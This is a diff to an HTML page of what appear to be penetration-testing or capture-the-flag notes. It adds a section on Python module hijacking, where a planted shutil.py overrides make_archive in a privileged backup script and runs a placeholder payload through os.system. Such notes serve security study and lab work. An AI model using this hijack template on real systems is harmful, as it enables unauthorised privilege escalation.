@@ -695,6 +695,62 @@ layout: default
             <li>Change "Image Type:" until a clear image is shown.</li>
         </ul>
     </ul>
+
+    <h2>Malicious Python Module</h2>
+    <table>
+        <tr>
+            <td>
+                <li>Vulnerable script(s) on victim machine</li>
+            </td>
+            <td>
+                <table>
+                    <tr>
+                        <td>
+                            <li>admin_tasks.py</li>
+                            <ul>
+                                <li>Calls backup.py</li>
+                            </ul>
+                        </td>
+                        <td>
+                            <pre>
+        (Removed irrelevant code)
+"….then
+        echo 'Running backup script in the background, it might take a while…'
+        /opt/scripts/backup.py &….."
+        (Removed irrelevant code)
+                            </pre>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>
+                            <li>backup.py</li>
+                            <ul>
+                                <li>imports shutil.py and execute make_archive with 3 arguments</li>
+                            </ul>
+                        </td>
+                        <td>
+                            <pre>
+#!/usr/bin/python3
+    (Removed irrelevant code)
+from shutil import make_archive
+   (Removed irrelevant code)
+…make_archive(dst, 'gztar', src)
+   (Removed irrelevant code)
+                            </pre>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Create malicious module - shutil.py</td>
+            <td>
+                <pre>
+import os&#13;&#10;&#13;&#10;def make_archive(a, b, c):&#13;&#10;os.system(&quot;&lt;malicious payload&quot;);
+                </pre>
+            </td>
+        </tr>
+    </table>
     
 </body>
 </html>
